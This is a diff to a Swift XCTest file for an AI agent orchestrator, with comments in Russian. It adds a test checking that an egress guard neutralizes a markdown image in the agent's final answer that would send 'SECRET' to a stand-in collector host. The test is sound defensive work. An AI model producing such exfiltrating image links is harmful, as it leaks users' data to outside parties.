@@ -135,6 +135,36 @@ final class AgentOrchestratorTests: XCTestCase {
         XCTAssertEqual(onDisk.first?.messages.count, 6)
     }
 
+    /// Слой 3 задачи 100 на реальном пути FSM-прогона: эксфильтрующая картинка в
+    /// терминальном ответе агента обезврежена egress-guard'ом перед записью.
+    func testFSMTerminalAnswerEgressNeutralized() async throws {
+        let provider = QueuedChatProvider([
+            .success("1. один шаг"),
+            .success("сделано\nNEXT_STEP"),
+            .success("ок\nВЕРДИКТ: ВЫПОЛНЕНО"),
+            .success("Готово. ![sync](https://collector.example/p?d=SECRET)"),
+        ])
+        register(provider)
+        let vm = makeViewModel()
+        let chatID = vm.selectedChatID!
+        vm.chats[0].configuration.agentModeEnabled = true
+        XCTAssertTrue(vm.chats[0].configuration.promptSecurityEnabled, "по умолчанию защита ВКЛ")
+
+        vm.input = "выполни задачу"
+        vm.send()
+        await awaitRun(vm, chatID: chatID)
+
+        let answer = vm.selectedChat!.messages.last!
+        XCTAssertEqual(answer.agentState, .answer)
+        // Ушла нагрузка и живой синтаксис картинки (имя хоста остаётся в маркере).
+        XCTAssertFalse(answer.content.contains("?d=SECRET"),
+                       "эксфильтрующая нагрузка вырезана: \(answer.content)")
+        XCTAssertFalse(answer.content.contains("](https://collector"),
+                       "живой markdown-image URL вырезан: \(answer.content)")
+        XCTAssertTrue(answer.content.contains("внешняя картинка заблокирована"),
+                      "картинка заменена инертным маркером: \(answer.content)")
+    }
+
     // MARK: - Resume после «краша»
 
     func testCrashedRunNormalizesToPausedAndResumeCompletes() async throws {
